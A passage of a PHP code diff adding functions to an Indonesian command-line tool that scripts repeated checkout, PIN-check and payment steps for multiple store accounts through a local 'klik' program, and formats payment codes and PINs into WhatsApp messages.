+            '1',
+            $namaFile,
+            $namaFile,
+            $akun['akun'],
+            $akun['akun'],
+            isset($pluData['value']) ? $pluData['value'] : '',
+            '1',
+            isset($pluData['qty']) ? $pluData['qty'] : '1',
+          ]);
+        } else {
+          if ($pluIndex === 1) {
+            $sequence = array_merge($sequence, [
+              $namaFile,
+              $namaFile,
+              $akun['akun'],
+              $akun['akun'],
+              isset($pluData['value']) ? $pluData['value'] : '',
+              '1',
+              isset($pluData['qty']) ? $pluData['qty'] : '1',
+            ]);
+          } else {
+            $sequence = array_merge($sequence, [
+              isset($pluData['value']) ? $pluData['value'] : '',
+              '1',
+              isset($pluData['qty']) ? $pluData['qty'] : '1',
+            ]);
+          }
+        }
+
+        if ($pluIndex < $pluCount) {
+          $sequence[] = 'y';
+        } else {
+          $sequence[] = 'n';
+
+          if ($index < count($dataAkun) - 1) {
+            $sequence[] = 'y';
+          } else {
+            $sequence[] = 'n';
+            $sequence[] = '';
+            if ($langsungco == "y") {
+              $sequence[] = '4';
+              $sequence[] = '1';
+              $sequence[] = '1';
+              $sequence[] = $namaFile;
+              $sequence[] = 'n';
+              $sequence[] = 'n';
+              $sequence[] = 'n';
+              $sequence[] = $namaFile;
+              $sequence[] = getTanggalOtomatis();
+              $sequence[] = getBulanOtomatis();
+              $sequence[] = autoShift();
+              $sequence[] = 'n';
+
+              if ($payementtoko == "y") {
+                $sequence[] = '8';
+              } else {
+                $sequence[] = '3';
+              }
+
+              $sequence[] = '1';
+              $sequence[] = (string)$jumlahBaris;
+              $sequence[] = 'n';
+              $sequence[] = '';
+              $sequence[] = '';
+            }
+            $sequence[] = '';
+          }
+        }
+
+        $pluIndex++;
+      }
+    }
+
+    jalankanKlik($sequence);
+  }
+}
+
+function autohapus() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        AUTO HAPUS KERANJANG           " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  $namaFile = autoCekKodeToko();
+  if (!$namaFile) {
+    return;
+  }
+  $jumlahBaris = 0;
+  if (file_exists($namaFile)) {
+    $file = fopen($namaFile, 'r');
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+    echo Warna::BOLD_HIJAU . "\n✓ Jumlah baris: $jumlahBaris\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_MERAH . "\n✗ File tidak ditemukan!\n" . Warna::RESET;
+    sleep(2);
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menjalankan proses...\n" . Warna::RESET;
+
+  sleep(2);
+
+  jalankanKlik([
+    '3', '4', $namaFile, '', '1', (string)$jumlahBaris, '', ''
+  ]);
+}
+
+function autoCheckout($jenisPayment, $kodePayment) {
+  $tanggalOtomatis = getTanggalOtomatis();
+  $bulanOtomatis = getBulanOtomatis();
+  $shiftOtomatis = getShiftOtomatis();
+  $judul = $jenisPayment;
+  if ($judul == "PP") {
+    $judul = " PP";
+  }
+
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "         AUTO CHECKOUT ($judul)           " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  date_default_timezone_set('Asia/Jakarta');
+  echo Warna::KUNING . "Waktu sistem    : " . date('H:i:s') . " WIB\n";
+  echo "Tanggal otomatis: $tanggalOtomatis\n";
+  echo "Bulan otomatis  : $bulanOtomatis\n";
+  echo "Payment kode    : $kodePayment\n";
+  echo "Shift           : {$shiftOtomatis['info']}\n" . Warna::RESET;
+
+  $namaFile = autoCekKodeToko();
+
+  $gunakanOtomatis = 'y';
+
+  if (strtolower($gunakanOtomatis) === 'y' || $gunakanOtomatis === '') {
+    $tanggal = $tanggalOtomatis;
+    $bulan = $bulanOtomatis;
+    $shiftKode = $shiftOtomatis['kode'];
+    $shiftInfo = $shiftOtomatis['info'];
+
+    echo Warna::BOLD_HIJAU . "\n✓ Menggunakan tanggal otomatis\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_KUNING . "› Tanggal (2 digit): " . Warna::RESET;
+    $tanggal = trim(fgets(STDIN));
+
+    echo Warna::BOLD_KUNING . "› Bulan (2 digit): " . Warna::RESET;
+    $bulan = trim(fgets(STDIN));
+
+    echo "\n" . Warna::PUTIH . "Pilih shift:\n";
+    echo "  1. Shift 1 - sebelum 13:00 (kode 9)\n";
+    echo "  2. Shift 1 - setelah 13:00 (kode 14)\n";
+    echo "  3. Shift 2 (kode 2)\n";
+    echo Warna::BOLD_KUNING . "› Pilihan (1/2/3): " . Warna::RESET;
+    $pilihanShift = trim(fgets(STDIN));
+
+    if ($pilihanShift == '2') {
+      $shiftKode = '14';
+      $shiftInfo = "1 (kode: 14)";
+    } elseif ($pilihanShift == '3') {
+      $shiftKode = '2';
+      $shiftInfo = "2 (kode: 2)";
+    } else {
+      $shiftKode = '9';
+      $shiftInfo = "1 (kode: 9)";
+    }
+
+    echo Warna::BOLD_HIJAU . "\n✓ Menggunakan shift: $shiftInfo\n" . Warna::RESET;
+  }
+
+  $jumlahBaris = 0;
+  if (file_exists($namaFile)) {
+    $file = fopen($namaFile, 'r');
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+    echo Warna::BOLD_HIJAU . "\n✓ File ditemukan: $namaFile\n";
+    echo "✓ Jumlah baris: $jumlahBaris\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_MERAH . "\n✗ File '$namaFile' tidak ditemukan!\n" . Warna::RESET;
+    sleep(2);
+    return;
+  }
+
+  echo Warna::BOLD_KUNING . "\n› Konfirmasi checkout:\n";
+  echo Warna::CYAN . "   Kode Toko: $namaFile\n";
+  echo "   Jumlah Akun: $jumlahBaris\n";
+  echo "   Tanggal Ambil : $tanggal/$bulan\n";
+  echo "   Shift : $shiftInfo\n";
+  echo "   Payment: $jenisPayment (kode: $kodePayment)\n";
+  echo Warna::BOLD_KUNING . "› Lanjutkan checkout? (y/n): " . Warna::RESET;
+  $konfirmasiAkhir = trim(fgets(STDIN));
+
+  if (strtolower($konfirmasiAkhir) !== 'y') {
+    echo Warna::BOLD_MERAH . "✗ Checkout dibatalkan\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menjalankan checkout ($jenisPayment)...\n" . Warna::RESET;
+  echo Warna::KUNING . "Ctrl+C atau ketik 'quit' untuk membatalkan\n\n" . Warna::RESET;
+
+  sleep(2);
+
+  jalankanKlik([
+    '4', '1', '1', $namaFile, 'n', 'n', 'n', $namaFile,
+    $tanggal, $bulan, $shiftKode, 'n', (string)$kodePayment,
+    '1', (string)$jumlahBaris, 'n', ''
+  ]);
+}
+
+function autoCekpin() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        AUTO CEK PIN TOKO              " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+
+  $namaFile = autoCekKodeToko();
+
+  $jumlahBaris = 0;
+  if (file_exists($namaFile)) {
+    $file = fopen($namaFile, 'r');
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+    echo Warna::BOLD_HIJAU . "\n✓ Jumlah baris: $jumlahBaris\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_MERAH . "\n✗ File tidak ditemukan!\n" . Warna::RESET;
+    sleep(2);
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menjalankan proses...\n" . Warna::RESET;
+
+  sleep(2);
+
+  jalankanKlik([
+    '5', '1', '', '', '', $namaFile, '1', (string)$jumlahBaris, '', '', '', ''
+  ]);
+}
+
+
+function autoCancel() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        AUTO CEK CANCEL TOKO              " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+
+  $namaFile = autoCekKodeToko();
+
+  $jumlahBaris = 0;
+  if (file_exists($namaFile)) {
+    $file = fopen($namaFile, 'r');
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+    echo Warna::BOLD_HIJAU . "\n✓ Jumlah baris: $jumlahBaris\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_MERAH . "\n✗ File tidak ditemukan!\n" . Warna::RESET;
+    sleep(2);
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menjalankan proses...\n" . Warna::RESET;
+
+  sleep(2);
+
+  jalankanKlik([
+    '5', '3', $namaFile, '1', (string)$jumlahBaris, '', '', '', ''
+  ]);
+}
+
+
+function autoCekPayment() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        AUTO CEK PAYMENT TOKO              " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+
+  $namaFile = autoCekKodeToko();
+
+  $jumlahBaris = 0;
+  if (file_exists($namaFile)) {
+    $file = fopen($namaFile, 'r');
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+    echo Warna::BOLD_HIJAU . "\n✓ Jumlah baris: $jumlahBaris\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_MERAH . "\n✗ File tidak ditemukan!\n" . Warna::RESET;
+    sleep(2);
+    return;
+  }
+
+  echo Warna::BOLD_CYAN . "\n▶ Menjalankan proses...\n" . Warna::RESET;
+
+  sleep(2);
+
+  jalankanKlik([
+    '5', '2', $namaFile, '1', (string)$jumlahBaris, '', '', '', ''
+  ]);
+}
+
+/*===========================================
+                KIRIM DATA PEMBAYARAN
+===========================================*/
+function kirimDataPembayaran() {
+  $filename = 'pembayaran.txt';
+
+  if (!file_exists($filename)) {
+    echo Warna::BOLD_MERAH . "\n✗ File $filename tidak ditemukan\n" . Warna::RESET;
+    return;
+  }
+
+  $data = bacaFilePembayaran($filename);
+
+  if (empty($data)) {
+    echo Warna::BOLD_MERAH . "\n✗ Tidak ada data pembayaran\n" . Warna::RESET;
+    return;
+  }
+
+  $kodeTersedia = getKodeTersedia($data);
+
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "        KIRIM DATA PEMBAYARAN          " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  echo Warna::KUNING . "Kode tersedia :\n" . implode("\n", $kodeTersedia) . Warna::RESET . "\n";
+
+  $kodeInput = "";
+  while (empty(trim($kodeInput))) {
+    echo Warna::BOLD_KUNING . "› Masukkan kode: " . Warna::RESET;
+    $kodeInput = trim(fgets(STDIN));
+    if (empty(trim($kodeInput))) {
+      echo Warna::BOLD_MERAH . "✗ Kode tidak boleh kosong!\n" . Warna::RESET;
+    }
+  }
+
+  $kodeInput = strtoupper(trim($kodeInput));
+  $filteredData = filterByKode($data, $kodeInput);
+
+  if (empty($filteredData)) {
+    echo Warna::BOLD_MERAH . "\n✗ Data dengan kode $kodeInput tidak ditemukan\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::BOLD_HIJAU . "\n✓ Ditemukan " . count($filteredData) . " data\n" . Warna::RESET;
+
+  echo Warna::BOLD_CYAN . "› Kirim ke WhatsApp? (y/n): " . Warna::RESET;
+  $konfirmasi = trim(fgets(STDIN));
+
+  if (strtolower($konfirmasi) === 'y' || $konfirmasi === '') {
+    $pesan = formatPesanPembayaran($filteredData, $kodeInput);
+    kirimKeWhatsApp($pesan);
+    telegram();
+    echo Warna::BOLD_CYAN . "› Hapus Data Payment? (y/n): " . Warna::RESET;
+    $konfirmasi = trim(fgets(STDIN));
+    if (strtolower($konfirmasi) === 'y') {
+      prosesHapusBaris('pembayaran.txt', $kodeInput, 'pembayaran');
+    }
+  }
+}
+
+function bacaFilePembayaran($filename) {
+  $data = [];
+  $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+  foreach ($lines as $line) {
+    if (preg_match('/^(\d+):([^:]+):([^:]+):(\d+):([^|\s]+)(?:\|([^\s]+))?(?:\s+EXP\s+([\d:]+))?$/', $line, $matches)) {
+      $data[] = [
+        'nomor' => $matches[1],
+        'token' => $matches[2],
+        'kode' => $matches[3],
+        'jumlah' => $matches[4],
+        'barcode' => $matches[5],
+        'url' => "https://fokus-nganggur.web.app/barcode#128/" . urlencode($matches[5]),
+        'expired' => $matches[7] ?? '',
+        'raw' => $line
+      ];
+    }
+  }
+
+  return $data;
+}
+
+function getKodeTersedia($data) {
+  $kodeUnik = [];
+  foreach ($data as $item) {
+    $kode = $item['kode'];
+    if (!in_array($kode, $kodeUnik)) {
+      $kodeUnik[] = $kode;
+    }
+  }
+  return $kodeUnik;
+}
+
+function filterByKode($data, $kode) {
+  return array_filter($data, function($item) use ($kode) {
+    return strtoupper($item['kode']) === strtoupper($kode);
+  });
+}
+
+function formatPesanPembayaran($items, $kode) {
+  $adaExpired = false;
+  foreach ($items as $item) {
+    if (!empty($item['expired'])) {
+      $adaExpired = true;
+      break;
+    }
+  }
+
+  if ($adaExpired) {
+    return formatPesanDenganExp($items, $kode);
+  } else {
+    return vaBca($items, $kode);
+  }
+}
+
+function formatPesanDenganExp($items, $kode) {
+  date_default_timezone_set('Asia/Jakarta');
+  $pesan = '';
+  $datatoko = getToko($kode);
+  $wrap = fn($text) => "`{$text}`";
+  $pesan .= $wrap("🔔 DATA PEMBAYARAN AKTIF") . "\n";
+  $pesan .= $wrap("- Kode Toko   : {$datatoko['kodetoko']}") . "\n";
+  $pesan .= $wrap("- Nama Toko   : {$datatoko['namatoko']}") . "\n";
+  $pesan .= $wrap("- Waktu       : " . date('H:i:s') . " WIB") . "\n";
+  $pesan .= $wrap("- Alamat Toko : {$datatoko['alamat']}") . "\n";
+  $pesan .= $wrap("════════════════════════════") . "\n";
+
+  $index = 1;
+  foreach ($items as $item) {
+    $pesan .= $wrap("💰 Pesanan $index       : Rp " . number_format($item['jumlah'])) . "\n";
+    $pesan .= $wrap("📟 Kode Bayar      : {$item['barcode']}") . "\n";
+
+    if (!empty($item['expired'])) {
+      $pesan .= $wrap("⏰ Bayar Sebelum   : {$item['expired']} WIB") . "\n";
+    }
+
+    if (!empty($item['url'])) {
+      $pesan .= $wrap("🔗 Scan Kode Bayar :") . "\n";
+      $pesan .= $item['url'] . "\n";
+    }
+
+    $pesan .= "\n";
+    $index++;
+  }
+
+  $pesan .= $wrap("📊 Total: " . count($items) . " data aktif") . "\n";
+  $pesan .= $wrap("⚠️  PERINGATAN :") . "\n";
+  $pesan .= $wrap("- KARNA ANDA SUDAH BILANG READY") . "\n";
+  $pesan .= $wrap("- JIKA EXPIRED SAYA ANGGAP HANGUS") . "\n";
+  $pesan .= $wrap("- TIDAK MENERIMA CO ULANG") . "\n";
+  $pesan .= $wrap("- UNTUK PIN SEGERA INFO JIKA SUDAH SELESAI PEMBAYARAN") . "\n";
+  $pesan .= $wrap("🙏 TERIMA KASIH 🙏");
+
+  return $pesan;
+}
+
+function vaBca($items, $kode) {
+  $pesan = "🔔 DATA PEMBAYARAN - $kode\n";
+  $pesan .= "⏰ Waktu: " . date('H:i:s') . " WIB\n";
+  $pesan .= "📅 Tanggal: " . date('d-m-Y') . "\n";
+  $pesan .= "════════════════════════════\n";
+
+  $index = 1;
+  foreach ($items as $item) {
+    $pesan .= "VA $index  Rp " . number_format($item['jumlah']) . " : `{$item['barcode']}`\n";
+    $index++;
+  }
+
+  $pesan .= "📊 Total: " . count($items) . " data\n";
+  $wrap = fn($text) => "`{$text}`";
+  $pesan .= $wrap("⚠️  PERINGATAN :") . "\n";
+  $pesan .= $wrap("- KARNA ANDA SUDAH BILANG READY") . "\n";
+  $pesan .= $wrap("- JIKA EXPIRED SAYA ANGGAP HANGUS") . "\n";
+  $pesan .= $wrap("- TIDAK MENERIMA CO ULANG") . "\n";
+  $pesan .= $wrap("- UNTUK PIN SEGERA INFO JIKA SUDAH SELESAI PEMBAYARAN") . "\n";
+  $pesan .= $wrap("🙏 TERIMA KASIH 🙏");
+  return $pesan;
+}
+
+function hapusBarisPembayaran() {
+  if (!file_exists('pembayaran.txt')) {
+    echo Warna::BOLD_MERAH . "\n✗ File pembayaran.txt tidak ditemukan\n" . Warna::RESET;
+    return;
+  }
+
+  $data = bacaFilePembayaran('pembayaran.txt');
+  $kodeTersedia = getKodeTersedia($data);
+
+  if (empty($kodeTersedia)) {
+    echo Warna::BOLD_MERAH . "\n✗ Tidak ada data pembayaran\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::KUNING . "Kode tersedia: " . implode(", ", $kodeTersedia) . Warna::RESET . "\n";
+
+  $kodeInput = "";
+  while (empty(trim($kodeInput))) {
+    echo Warna::BOLD_KUNING . "› Masukkan kode: " . Warna::RESET;
+    $kodeInput = trim(fgets(STDIN));
+    if (empty(trim($kodeInput))) {
+      echo Warna::BOLD_MERAH . "✗ Kode tidak boleh kosong!\n" . Warna::RESET;
+    }
+  }
+
+  $kodeInput = strtoupper(trim($kodeInput));
+  prosesHapusBaris('pembayaran.txt', $kodeInput, 'pembayaran');
+}
+
+function prosesHapusBaris($filename, $kode, $jenis) {
+  if (!file_exists($filename)) {
+    echo Warna::BOLD_MERAH . "\n✗ File $filename tidak ditemukan\n" . Warna::RESET;
+    return;
+  }
+
+  $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+  if ($jenis === 'pembayaran') {
+    $backupFile = str_replace('.txt', '.backup', $filename);
+    $existingBackup = [];
+
+    if (file_exists($backupFile)) {
+      $existingBackup = file($backupFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    }
+
+    $linesToBackup = [];
+    foreach ($lines as $line) {
+      if (preg_match('/^(\d+):([^:]+):' . preg_quote($kode, '/') . ':/', $line)) {
+        if (!in_array($line, $existingBackup)) {
+          $linesToBackup[] = $line;
+        }
+      }
+    }
+
+    if (!empty($linesToBackup)) {
+      $backupContent = implode("\n", $existingBackup);
+      if (!empty($existingBackup)) {
+        $backupContent .= "\n";
+      }
+      $backupContent .= implode("\n", $linesToBackup);
+      file_put_contents($backupFile, $backupContent . "\n");
+    }
+  }
+
+  $remainingLines = [];
+  $deletedCount = 0;
+
+  foreach ($lines as $line) {
+    $shouldDelete = false;
+
+    if ($jenis === 'pembayaran') {
+      if (preg_match('/^(\d+):([^:]+):' . preg_quote($kode, '/') . ':/', $line)) {
+        $shouldDelete = true;
+      }
+    } else if ($jenis === 'pin') {
+      if (strpos($line, "KODE TOKO:") !== false && strpos($line, "($kode)") !== false) {
+        $shouldDelete = true;
+      }
+    }
+
+    if ($shouldDelete) {
+      $deletedCount++;
+    } else {
+      $remainingLines[] = $line;
+    }
+  }
+
+  if ($deletedCount > 0) {
+    file_put_contents($filename, implode("\n", $remainingLines) . "\n");
+
+    echo Warna::BOLD_HIJAU . "\n✓ DATA BERHASIL DIHAPUS\n";
+    echo Warna::HIJAU . "  Terhapus : $deletedCount baris\n";
+    echo "  Tersisa  : " . count($remainingLines) . " baris\n" . Warna::RESET;
+  } else {
+    echo Warna::BOLD_KUNING . "\nℹ Tidak ada data dengan kode '$kode'\n" . Warna::RESET;
+  }
+}
+
+/*===========================================
+                KIRIM DATA PIN
+===========================================*/
+function bacaFilePin($kode) {
+  $namaFile = "pin_{$kode}.txt";
+  $folder = "pinbanyak";
+  $filePath = $folder . '/' . $namaFile;
+
+  if (!file_exists($filePath)) {
+    return [];
+  }
+
+  $dataPerTanggal = [];
+  $allTransactions = [];
+  $seenLines = [];
+
+  $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+  foreach ($lines as $line) {
+    $line = trim($line);
+    if (empty($line)) continue;
+
+    $lineHash = md5($line);
+    if (isset($seenLines[$lineHash])) continue;
+    $seenLines[$lineHash] = true;
+
+    $pattern = '/^(.+?)\s+NOMOR:\s*(\d+)\s+PIN:\s*(\S+)\s+STATUS:\s*(.+?)\s+ID_TRX:\s*(\S+)\s+KODE TOKO:\s*(.+?)\s+PRODUK:\s*(.+?)\s+Qty:\s*(\d+)\s+WAKTU:\s*([^ ]+)(?:\s+BARCODE:\s*(\S+))?$/';
+
+    if (preg_match($pattern, $line, $matches)) {
+      $username = trim($matches[1]);
+      $nomor = trim($matches[2]);
+      $pin = trim($matches[3]);
+      $status = trim($matches[4]);
+      $id_trx = trim($matches[5]);
+      $kodetoko = trim($matches[6]);
+      $produkNama = trim($matches[7]);
+      $qty = intval(trim($matches[8]));
+      $waktu = trim($matches[9]);
+
+      $tanggal = substr($waktu, 0, 10);
+
+      $transaction = [
+        'username' => $username,
+        'nomor' => $nomor,
+        'pin' => $pin,
+        'status' => $status,
+        'id_trx' => $id_trx,
+        'kodetoko' => $kodetoko,
+        'produk' => $produkNama,
+        'qty' => $qty,
+        'waktu' => $waktu,
+        'tanggal' => $tanggal
+      ];
+
+      if (!isset($dataPerTanggal[$tanggal])) {
+        $dataPerTanggal[$tanggal] = [
+          'transactions' => [],
+          'produkSummary' => []
+        ];
+      }
+
+      $dataPerTanggal[$tanggal]['transactions'][] = $transaction;
+      $allTransactions[] = $transaction;
+
+      if (!isset($dataPerTanggal[$tanggal]['produkSummary'][$produkNama])) {
+        $dataPerTanggal[$tanggal]['produkSummary'][$produkNama] = 0;
+      }
+      $dataPerTanggal[$tanggal]['produkSummary'][$produkNama] += $qty;
+    }
+  }
+
+  return [
+    'dataPerTanggal' => $dataPerTanggal,
+    'allTransactions' => $allTransactions
+  ];
+}
+
+function formatPesanPin($data, $kodePin) {
+  if (empty($data['allTransactions'])) {
+    return "❌ Tidak ada data untuk kode PIN: `$kodePin`";
+  }
+
+  $dataPerTanggal = $data['dataPerTanggal'];
+  $allTransactions = $data['allTransactions'];
+
+  $kodetoko = $allTransactions[0]['kodetoko'];
+  $pesan = "`📌 PIN PENGAMBILAN PESANAN KLIK`\n";
+  $pesan .= "`🏪 KODE TOKO: $kodetoko`\n";
+  $pesan .= "`═══════════════════════════`\n\n";
+
+  $totalTrx = 0;
+  $totalProdukUnik = 0;
+  $totalQty = 0;
+
+  foreach ($dataPerTanggal as $tanggal => $dataTanggal) {
+    $tanggalFormatted = date('d-m-Y', strtotime($tanggal));
+
+    $pesan .= "`📅 PESANAN TANGGAL: $tanggalFormatted`\n";
+    $pesan .= "`───────────────────────────`\n";
+
+    $trxPerTanggal = count($dataTanggal['transactions']);
+    $qtyPerTanggal = 0;
+
+    foreach ($dataTanggal['transactions'] as $index => $transaction) {
+      $pesan .= "`👤 " . $transaction['username'] . "`\n";
+      $pesan .= "`🆔 " . $transaction['id_trx'] . " | 🔐 " . $transaction['pin'] . "`\n";
+      $pesan .= "🔗 https://fokus-nganggur.web.app/barcode#128/" . $transaction['pin'] . "\n";
+
+      if ($index < $trxPerTanggal - 1) {
+        $pesan .= "\n";
+      }
+
+      $qtyPerTanggal += $transaction['qty'];
+    }
+
+    $pesan .= "`───────────────────────────`\n";
+    $pesan .= "\n\n`📦 DETAIL ITEM :`\n";
+    $pesan .= "`───────────────────────────`\n";
+
+    $maxProdukLength = 0;
+    foreach ($dataTanggal['produkSummary'] as $produk => $total) {
+      $maxProdukLength = max($maxProdukLength, strlen($produk));
+    }
+
+    foreach ($dataTanggal['produkSummary'] as $produk => $total) {
+      $produkPad = str_pad($produk, $maxProdukLength, " ", STR_PAD_RIGHT);
+      $pesan .= "`-$total pcs : $produkPad`\n";
+    }
+
+    $pesan .= "\n`📊 REKAP TANGGAL: $tanggalFormatted`\n";
+    $pesan .= "`───────────────────────────`\n";
+    $pesan .= "`📈 Total TRX   : $trxPerTanggal`\n";
+    $pesan .= "`📦 Total Qty   : $qtyPerTanggal`\n";
+    $pesan .= "`📋 Total Item  : " . count($dataTanggal['produkSummary']) . "`\n";
+    $pesan .= "`═══════════════════════════`\n\n";
+
+    $totalTrx += $trxPerTanggal;
+    $totalProdukUnik += count($dataTanggal['produkSummary']);
+    $totalQty += $qtyPerTanggal;
+  }
+
+  return $pesan;
+}
+
+function kirimDataPin() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "         KIRIM DATA CEK PIN            " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  $kodeTersedia = getKodePinTersedia();
+
+  if (empty($kodeTersedia)) {
+    echo Warna::BOLD_MERAH . "\n✗ Tidak ditemukan file PIN\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::KUNING . "Kode PIN tersedia:\n" . implode("\n", $kodeTersedia) . Warna::RESET . "\n";
+
+  $kodeInput = "";
+  while (empty(trim($kodeInput))) {
+    echo Warna::BOLD_KUNING . "› Masukkan kode toko : " . Warna::RESET;
+    $kodeInput = trim(fgets(STDIN));
+    if (empty(trim($kodeInput))) {
+      echo Warna::BOLD_MERAH . "✗ Kode PIN tidak boleh kosong!\n" . Warna::RESET;
+    }
+  }
+
+  $kodeInput = strtoupper(trim($kodeInput));
+  $data = bacaFilePin($kodeInput);
+
+  if (empty($data['allTransactions'])) {
+    echo Warna::BOLD_MERAH . "\n✗ Data dengan kode PIN $kodeInput tidak ditemukan\n" . Warna::RESET;
+    return;
+  }
+
+  echo Warna::BOLD_HIJAU . "\n✓ Ditemukan " . count($data['allTransactions']) . " data\n" . Warna::RESET;
+
+  echo Warna::BOLD_CYAN . "› Kirim ke WhatsApp? (y/n): " . Warna::RESET;
+  $konfirmasi = trim(fgets(STDIN));
+
+  if (strtolower($konfirmasi) === 'y' || $konfirmasi === '') {
+    $pesan = formatPesanPin($data, $kodeInput);
+    kirimKeWhatsApp($pesan);
+    hapusFilePin($kodeInput);
+  }
+}
+
+function getKodePinTersedia() {
+  $kodeUnik = [];
+  $folder = "pinbanyak";
+  if (!is_dir($folder)) {
+    return [];
+  }
+
+  $files = scandir($folder);
+  foreach ($files as $file) {
+    if (preg_match('/^pin_([A-Z0-9]+)\.txt$/i', $file, $matches)) {
+      $kode = strtoupper($matches[1]);
+      if (!in_array($kode, $kodeUnik)) {
+        $kodeUnik[] = $kode;
+      }
+    }
+  }
+
+  return $kodeUnik;
+}
+
+function hapusFilePin($kode) {
+  $namaFile = "pin_{$kode}.txt";
+  $folder = "pinbanyak";
+  $filePath = $folder . '/' . $namaFile;
+
+  if (file_exists($filePath)) {
+    if (unlink($filePath)) {
+      echo Warna::BOLD_HIJAU . "\n✓ File PIN berhasil dihapus\n" . Warna::RESET;
+    } else {
+      echo Warna::BOLD_MERAH . "\n✗ Gagal menghapus file\n" . Warna::RESET;
+    }
+  }
+}
+
+function hapusBarisTerkirim() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "       HAPUS BARIS TERKIRIM            " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  echo Warna::PUTIH . "   [1] Data Pembayaran (pembayaran.txt)\n";
+  echo "   [2] Data PIN (checkpin files)\n";
+  echo "   [0] Kembali\n";
+
+  $pilihan = readline(Warna::BOLD_KUNING . "\n› Pilih [0-2]: " . Warna::RESET);
+
+  switch ($pilihan) {
+  case '1': hapusBarisPembayaran(); break;
+  case '2':
+    listPinBanyak();
+    echo Warna::BOLD_KUNING . "\n› Kode Toko: " . Warna::RESET;
+    $kode = trim(fgets(STDIN));
+    hapusFilePin($kode);
+    break;
+  case '0': return;
+  default: echo Warna::BOLD_MERAH . "\n✗ Pilihan tidak valid!\n" . Warna::RESET;
+  }
+}
+
+function listPinBanyak() {
+  $folder = "pinbanyak";
+  $files = glob($folder . "/pin_*.txt");
+
+  echo Warna::KUNING . "\nFile PIN tersedia:\n" . Warna::RESET;
+  foreach ($files as $file) {
+    $nama = basename($file);
+    $kode = str_replace(["pin_", ".txt"], "", $nama);
+    echo Warna::HIJAU . "  - $kode\n" . Warna::RESET;
+  }
+}
+
+/*===========================================
+                 GAS JASDER
+===========================================*/
+function jalankanGasJasder() {
+  echo Warna::BOLD_CYAN . "\n╔═══════════════════════════════════════╗\n";
+  echo "║" . Warna::BOLD_HIJAU . "          GAS JASDER AREA              " . Warna::BOLD_CYAN . "║\n";
+  echo "╚═══════════════════════════════════════╝\n" . Warna::RESET;
+
+  echo Warna::KUNING . "• Mode auto-restart aktif\n";
+  echo "• Gunakan 'quit' atau 'exit' untuk kembali\n";
+  echo "• Ctrl+C untuk menghentikan\n" . Warna::RESET;
+
+  $restartCount = 0;
+  $maxRestarts = 1000;
+
+  while ($restartCount < $maxRestarts) {
+    $restartCount++;
+
+    $cmd = 'script -q -c klik /dev/null';
+
+    $descriptor = [
+      0 => ["pipe",
+        "r"],
+      1 => ["pipe",
+        "w"],
+      2 => ["pipe",
+        "w"]
+    ];
+
+    $process = proc_open($cmd, $descriptor, $pipes);
+
+    if (!is_resource($process)) {
+      echo Warna::BOLD_MERAH . "\n✗ Gagal menjalankan klik, restart...\n" . Warna::RESET;
+      sleep(3);
+      continue;
+    }
+
+    stream_set_blocking($pipes[1], false);
